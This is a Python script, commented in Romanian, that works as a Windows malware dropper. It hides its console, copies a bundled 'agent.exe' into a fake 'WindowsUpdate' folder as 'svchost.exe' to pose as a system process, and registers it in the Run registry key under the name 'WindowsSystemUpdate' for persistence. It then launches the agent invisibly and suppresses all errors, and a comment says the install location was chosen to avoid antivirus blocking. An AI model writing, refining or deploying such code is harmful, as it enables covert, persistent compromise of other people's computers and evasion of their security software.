import os
import shutil
import subprocess
import sys
import ctypes
import time
import winreg as reg

# ====================== ASCUNDERE CONSOLĂ ======================
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def get_base_path():
    if getattr(sys, 'frozen', False):
        return sys._MEIPASS
    else:
        return os.path.dirname(os.path.abspath(__file__))

def add_to_startup(agent_path: str) -> bool:
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER,
                         r"Software\Microsoft\Windows\CurrentVersion\Run",
                         0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsSystemUpdate", 0, reg.REG_SZ, agent_path)
        reg.CloseKey(key)
        return True
    except:
        return False

def main():
    # Locație mai sigură (AppData\Local\Temp) - evită blocarea de către AV
    install_dir = os.path.join(os.getenv('LOCALAPPDATA'), "WindowsUpdate")
    try:
        os.makedirs(install_dir, exist_ok=True)
    except PermissionError:
        # Fallback dacă tot nu merge
        install_dir = os.path.join(os.path.expanduser("\~"), "WindowsUpdate")
        os.makedirs(install_dir, exist_ok=True)

    base_path = get_base_path()
    agent_source = os.path.join(base_path, "agent.exe")
    agent_dest   = os.path.join(install_dir, "svchost.exe")

    try:
        if not os.path.exists(agent_source):
            return

        # Copiem agentul
        shutil.copy2(agent_source, agent_dest)

        # Adăugăm persistență la repornire
        add_to_startup(agent_dest)

        # Pornim agentul ascuns
        subprocess.Popen([agent_dest],
                         creationflags=subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP)

    except:
        pass   # complet silent

if __name__ == "__main__":
    main()